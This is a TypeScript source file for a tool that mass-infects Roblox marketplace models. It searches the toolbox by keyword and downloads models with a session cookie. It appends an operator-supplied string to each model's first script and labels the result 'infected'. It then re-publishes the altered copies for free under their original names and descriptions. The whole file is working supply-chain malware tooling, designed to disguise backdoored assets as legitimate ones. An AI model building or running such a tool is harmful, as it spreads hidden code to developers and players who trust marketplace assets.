import axios from "axios";
import * as readline from "readline";
import { RobloxFile } from "rbxm-parser";
import * as fs from "fs";
import * as path from "path";
import noblox from "noblox.js";

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

const stats = {
  modified: 0,
  scanned: 0,
  errors: 0,
  uploaded: 0,
};

let uploadLimit = 0;

async function searchModels(keyword: string, cursor?: string): Promise<any> {
  try {
    const url = `https://apis.roblox.com/toolbox-service/v1/marketplace/10?keyword=${encodeURIComponent(
      keyword
    )}${cursor ? `&cursor=${cursor}` : ""}`;
    const response = await axios.get(url);
    return response.data;
  } catch (error) {
    stats.errors++;
    console.log("[ERROR] Failed to search models: ", error);
    return null;
  }
}

async function downloadModel(modelId: number, cookie: string): Promise<Buffer | null> {
  try {
    const response = await axios.get(
      `https://assetdelivery.roblox.com/v1/asset/?id=${modelId}`,
      {
        responseType: "arraybuffer",
        headers: {
          Cookie: `.ROBLOSECURITY=${cookie}`,
          "Content-Type": "application/json",
        }
      }
    );
    return Buffer.from(response.data);
  } catch (error) {
    stats.errors++;
    console.log("[ERROR] Failed to download model:", error);
    return null;
  }
}


function modifyScript(
  file: RobloxFile,
  stringToAdd: string,
  modelId: string
): boolean {
  try {
    const scripts = file.FindDescendantsOfClass("Script");

    if (scripts.length > 0) {
      const script = scripts[0];
      if (script.Source) {
        script.Source = script.Source.trim() + "\n" + stringToAdd;
        stats.modified++;
        console.log("[SUCCESS] Infected model ", modelId);
        return true;
      }
    }
    return false;
  } catch (error) {
    console.log("[ERROR] Failed to modify script:", error);
    return false;
  }
}

async function initializeNoblox(cookie: string) {
  try {
    await noblox.setCookie(cookie);
    const currentUser = await noblox.getAuthenticatedUser();
    console.log(`[SUCCESS] Logged in as: ${currentUser.name}`);
    return true;
  } catch (error) {
    console.log("[ERROR] Failed to initialize with cookie:", error);
    return false;
  }
}

async function makeModelPublic(assetId: number, cookie: string) {
  try {
    const response = await axios.patch(
      `https://apis.roblox.com/user/cloud/v2/creator-store-products/PRODUCT_NAMESPACE_CREATOR_MARKETPLACE_ASSET-PRODUCT_TYPE_MODEL-${assetId}?allowMissing=true`,
      {
        basePrice: {
          currencyCode: "USD",
          quantity: {
            significand: 0,
            exponent: 0,
          },
        },
        published: true,
        modelAssetId: assetId.toString(),
      },
      {
        headers: {
          Cookie: `.ROBLOSECURITY=${cookie}`,
          "Content-Type": "application/json",
          "X-CSRF-TOKEN": await noblox.getGeneralToken(),
        },
      }
    );
    console.log(`[SUCCESS] Made model ${assetId} public`);
    return true;
  } catch (error) {
    console.log(`[ERROR] Failed to make model ${assetId} public:`, error);
    return false;
  }
}

async function getModelDetails(assetId: number) {
  try {
    const response = await axios.get(
      `https://apis.roblox.com/toolbox-service/v1/items/details?assetIds=${assetId}`
    );

    if (response.data?.data?.[0]?.asset) {
      return response.data.data[0].asset;
    }
    return null;
  } catch (error) {
    console.log(`[ERROR] Failed to get model details:`, error);
    return null;
  }
}

async function uploadModel(filePath: string, name: string, description: string, cookie: string) {
  try {
    const file = fs.readFileSync(filePath);
    // @ts-ignore
    const assetId: number = await noblox.uploadModel(file, { name: name, description: description });

    await new Promise((resolve) => setTimeout(resolve, 2000));

    await makeModelPublic(assetId, cookie);

    stats.uploaded++;
    console.log(
      `[SUCCESS] Uploaded and published model: ${name} (Asset ID: ${assetId})`
    );
    fs.rmSync(filePath)
    return assetId;
  } catch (error) {
    console.log("[ERROR] Failed to upload model:", error);
    return null;
  }
}

async function processModel(
  model: any,
  stringToAdd: string,
  modifiedDir: string,
  cookie: string
) {
  try {
    const originalInfo: any = await getModelDetails(model.id);
    const modelData = await downloadModel(model.id, cookie);
    if (!modelData) return;

    const file = RobloxFile.ReadFromBuffer(modelData);
    if (!file) return;

    const modified = modifyScript(file, stringToAdd, model.id.toString());

    if (modified) {
      const modifiedPath = path.join(modifiedDir, `${model.id}_infected.rbxm`);
      fs.writeFileSync(modifiedPath, file.WriteToBuffer());
      const originalName = originalInfo.name || "Best Model";
      const originalDescription = originalInfo.description || "Best Model";
      await uploadModel(modifiedPath, originalName, originalDescription, cookie);
    }

    stats.scanned++;
  } catch (error) {
    stats.errors++;
    console.log("[ERROR] Failed to process model:", error);
  }
}

async function processAllPages(
  query: string,
  stringToAdd: string,
  cookie: string
) {
  let cursor: string | undefined = undefined;

  const modifiedDir = path.join(process.cwd(), "temp");
  if (!fs.existsSync(modifiedDir)) {
    fs.mkdirSync(modifiedDir);
  }

  do {
    try {
      const searchResults = await searchModels(query, cursor);

      if (!searchResults || !searchResults.data) {
        console.log("[ERROR] No results");
        break;
      }

      for (let i = 0; i < searchResults.data.length; i++) {
        await processModel(
          searchResults.data[i],
          stringToAdd,
          modifiedDir,
          cookie
        );

        if (stats.uploaded >= uploadLimit) {
          console.log("\nReached upload limit. Stopping...");

          console.log("\nFinal Stats:");
          console.log(`Uploaded: ${stats.uploaded}`);
          console.log(`Errors: ${stats.errors}`);

          return;
        }

        if (i % 10 === 0 && global.gc) {
          global.gc();
        }
      }

      cursor = searchResults.nextPageCursor;
    } catch (error) {
      console.log("[ERROR] Error processing page:", error);
      stats.errors++;
    }

    if (global.gc) {
      global.gc();
    }
  } while (cursor);

  console.log("\nFinal Stats:");
  console.log(`Modified: ${stats.modified}`);
  console.log(`Scanned: ${stats.scanned}`);
  console.log(`Uploaded: ${stats.uploaded}`);
  console.log(`Errors: ${stats.errors}`);
}

async function main() {
  rl.question("Enter your Roblox cookie: ", async (cookie) => {
    const initialized = await initializeNoblox(cookie);
    if (!initialized) {
      console.log("[ERROR] Failed to initialize with provided cookie");
      rl.close();
      return;
    }
    rl.question("How many assets to upload: ", (amount: any) => {
      if (!Math.floor(amount)) {
        console.log("[ERROR] Invalid number");
        return;
      }
      uploadLimit = amount;
      rl.question("Enter search query: ", (query) => {
        rl.question("Enter string to add to scripts: ", async (stringToAdd) => {
          await processAllPages(query, stringToAdd, cookie);
          rl.close();
        });
      });
    });
  });
}

main();
